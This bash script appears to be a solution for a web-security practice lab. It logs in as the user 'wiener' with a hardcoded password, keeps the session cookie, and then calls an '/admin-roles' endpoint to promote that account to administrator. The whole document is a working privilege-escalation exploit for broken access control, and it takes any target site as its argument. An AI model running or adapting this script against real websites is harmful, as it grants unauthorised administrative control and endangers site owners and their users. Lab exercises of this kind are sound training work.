#!/bin/bash


login() {
    echo "(+) Logging in as user Wiener..."
    login_page="$url/login"
    export cookie=$(curl -s -o /dev/null -c - "${login_page}" -d "username=wiener&password=peter" | awk '/session/ {print $NF}')
    account="$url/my-account?id=wiener"
    response=$(curl -s -o /dev/null "${account}" -w "%{http_code}" -b "session="${cookie}"")
    if [[ "${response}" -eq 200 ]]; then
        echo "(+) Logged in successfully!"
    else
        echo "(-) Could not login!"
        echo "(-) Exiting..."
        exit 1
    fi
}

upgrade_user() {
    echo "(+) Upgrading user Wiener to admin..."
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url/admin-roles?username=wiener&action=upgrade" -b "session="${cookie}"")
    if [[ "${response}" -eq 302 ]]; then
        echo "(+) Upgraded user Wiener successfully!"
    else
        echo "(-) Could not upgrade user Wiener."
        echo "(-) Exiting..."
        exit 1
    fi
}

main() {
    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    echo "(+) Starting the script..."
    url="$1"
    login "$url"
    upgrade_user "$url"
}
main "$@"